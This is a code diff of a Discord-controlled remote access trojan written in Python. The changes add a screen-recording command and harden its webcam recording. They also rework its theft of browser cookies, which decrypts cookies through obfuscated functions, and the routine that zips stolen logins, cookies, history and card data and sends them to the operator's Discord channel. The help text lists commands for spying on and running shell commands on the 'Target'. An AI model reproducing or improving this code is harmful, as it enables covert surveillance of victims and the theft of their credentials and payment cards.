@@ -29,8 +29,9 @@ import platform
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 import json
-
-
+import pyautogui
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 intents = discord.Intents.all()
 intents.all()
@@ -53,10 +54,9 @@ temp_path = os.path.join(temp, ''.join(random.choices(
     "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=50)))
 os.mkdir(temp_path)
 
-
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-
+localappdata = os.getenv("localappdata")
 computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
     errors='ignore').strip().splitlines()[2].strip()
 cpu = subprocess.run(["wmic", "cpu", "get", "Name"],
@@ -230,24 +230,57 @@ async def stop(ctx):
         await channel.send('```Stopped!```')
 
 
-@bot.command(name="video")
+@bot.command(name="screen_record")
+async def screenshare(ctx, seconds: int):
+    if control_channel(ctx) == True:
+
+        start_time = time()
+        try:
+            screen_size = pyautogui.size()
+            fourcc = cv2.VideoWriter_fourcc(*"XVID")
+            videofile_path = temp_path + '\\screen_record.avi'
+
+            out = cv2.VideoWriter(videofile_path, fourcc, 20.0, screen_size)
+
+            while True:
+                img = pyautogui.screenshot()
+
+                frame = np.array(img)
+                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+
+                out.write(frame)
+
+                elapsed_time = time() - start_time
+                if elapsed_time >= seconds:
+                    break
+
+            out.release()
+            cv2.destroyAllWindows()
+
+            await ctx.channel.send("```Here is your screen recording!```", file=discord.File(videofile_path, filename="screen_record.avi"))
+
+        except Exception as e:
+            await ctx.channel.send(f"```Error: {str(e)} ```")  
+
+@bot.command(name="web_video")
 async def recordvideo(ctx, seconds: int):
     if control_channel(ctx) == True:
 
         start_time = time()
         try:
-            # OpenCV VideoCapture
             video_capture = cv2.VideoCapture(0)
+            if not video_capture.isOpened():
+                raise ValueError("No camera found")
 
-            # Define the codec and create a VideoWriter object
             fourcc = cv2.VideoWriter_fourcc(*'XVID')
             videofile_path = temp_path + '\\webcam.avi'
             out = cv2.VideoWriter(videofile_path, fourcc, 20.0, (640, 480))
 
             while True:
                 ret, frame = video_capture.read()
+                if not ret:
+                    raise ValueError("Failed to read frame from camera")
 
-                # Record Video
                 out.write(frame)
 
                 elapsed_time = time() - start_time
@@ -261,7 +294,9 @@ async def recordvideo(ctx, seconds: int):
             await ctx.channel.send("```Here It Is!```\n", file=discord.File(videofile_path, filename="webcam.avi"))
 
         except Exception as e:
-            await ctx.channel.send(f"```Error :\n {e} ``` ")
+            await ctx.channel.send(f"```Error: {str(e)} ```")
+
+
 
 
 @bot.command(name="recordvoice")
@@ -618,29 +653,39 @@ def g34_l0g1n_d474(path: str, profile: str, master_key: bytes, LOGINS):
     os.remove('login_db')
 
 def g47_c00k13s(path: str, profile: str, master_key: bytes, COOKIES):
+    import logging
     cookie_db = os.path.join(path, profile, 'Network', 'Cookies')
     if not os.path.exists(cookie_db):
         return
 
     try:
         shutil.copy(cookie_db, 'cookie_db')
-        conn = sqlite3.connect('cookie_db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1] or not row[2] or not row[3]:
-                continue
+        with sqlite3.connect('cookie_db') as conn:
+            cursor = conn.cursor()
+            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+            rows = cursor.fetchall()
+            for row in rows:
+                try:
+                    if not row[0] or not row[1] or not row[2] or not row[3]:
+                        continue
 
-            cookie = decrypt_password(row[3], master_key)
-            COOKIES.append(f'{row[0]}\t{"FALSE" if row[4] == 0 else "TRUE"}\t{row[2]}\t{"FALSE" if row[0].startswith(".") else "TRUE"}\t{row[4]}\t{row[1]}\t{cookie}')
-
-        conn.close()
-        os.remove('cookie_db')
+                    cookie = decrypt_password(row[3], master_key)
+                    COOKIES.append(f'{row[0]}\t{"FALSE" if row[4] == 0 else "TRUE"}\t{row[2]}\t{"FALSE" if row[0].startswith(".") else "TRUE"}\t{row[4]}\t{row[1]}\t{cookie}')
+                except sqlite3.OperationalError as e:
+                    logging.error(f"Could not decode row: {row} - {e}")
+                    continue
+    except sqlite3.OperationalError as e:
+        logging.error(f"Database operation failed: {e}")
     except PermissionError:
-        print(f"Permission denied: {cookie_db}")
+        logging.error(f"Permission denied: {cookie_db}")
     except FileNotFoundError:
-        print("cookie_db not found")
-
+        logging.error("cookie_db not found")
+    finally:
+        if os.path.exists('cookie_db'):
+            try:
+                os.remove('cookie_db')
+            except PermissionError:
+                logging.error(f"Could not remove cookie_db: {cookie_db}")
 def g37_w36_h1570r7(path: str, profile: str, WEB_HISTORY):
     web_history_db = os.path.join(path, profile, 'History')
     if not os.path.exists(web_history_db):
@@ -731,18 +776,22 @@ def write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARD
             zipf.write(f"dinner/{file}", file)
 
 async def send_dinner(ctx):
-    dinner_zip_path = Path("dinner.zip")
-    with ZipFile(dinner_zip_path, 'w') as zipf:
-        for file_path in Path("dinner").rglob('*'):
-            zipf.write(file_path, file_path.relative_to("dinner"))
 
-    embed = discord.Embed(
-        title="Dinner",
-        description="```" + '\n'.join(tree(Path("dinner"))) + "```"
-    )
+    try:
+        dinner_zip_path = Path("dinner.zip")
+        with ZipFile(dinner_zip_path, 'w') as zipf:
+            for file_path in Path("dinner").rglob('*'):
+                zipf.write(file_path, file_path.relative_to("dinner"))
 
-    file = discord.File(dinner_zip_path, filename="dinner.zip")
-    await ctx.send(embed=embed, file=file)
+        embed = discord.Embed(
+            title="Dinner",
+            description="```" + '\n'.join(tree(Path("dinner"))) + "```"
+        )
+
+        file = discord.File(dinner_zip_path, filename="dinner.zip")
+        await ctx.send(embed=embed, file=file)
+    except Exception as e:
+        await ctx.send(f"```Error :\n {e} ``` ")
 
 def clean():
     shutil.rmtree("dinner")
@@ -797,9 +846,9 @@ async def passwrd(ctx):
                     continue
 
                 g34_l0g1n_d474(path, profile, master_key, LOGINS)
-                g47_c00k13s(path, profile, master_key, COOKIES)
                 g37_w36_h1570r7(path, profile, WEB_HISTORY)
                 g35_40wnl044s(path, profile, DOWNLOADS)
+                g47_c00k13s(path, profile, master_key, COOKIES)
                 g34_3r341t_3434s(path, profile, master_key, CARDS)
 
         write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS)
@@ -842,14 +891,14 @@ async def helpmsg(ctx):
 
         return
     await ctx.channel.send(r"""```
-!helpme : Shows Commands. 
+!helpme : Shows Commands.
+!screen_record (second) : Record Screen.    
 !ss (number) : Take Screenshot.
-!getinfo : Get Them Info.
 !recordvoice (second) : Record a Voice File.
 !ws (number) : Webcamshot.
 !wstream :Real Time Photos.
 !stopstream :Stop Real Time Photos.
-!video (second) : Record Video.
+!web_video (second) : Record Video.
 !ps (command) : Sends Commands to Target.
 !cd (folder name) : Change Directory With That.
 !kill (procces) : Kill a Task.
@@ -871,7 +920,7 @@ async def helpmsg(ctx):
 DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
     example usage : !ws 10 it will take 10 webcamshot for a second.
     example usage : !recordvoice 10 it will record the voice for 10 seconds.
-    example usage : !video 10 it will record the webcam for 10 seconds.
+    example usage : !web_video 10 it will record the webcam for 10 seconds.
     example usage : !ss 4 it will take 4 ss for a second.
     example usage : !voice (voice file.)
     example usage : !msg (custom sentences.)
@@ -964,6 +1013,3 @@ md (Make Directory):
 Usage: md [directory name]
 Example: md NewFolder
                    ```""")
-
-
-bot.run(token)
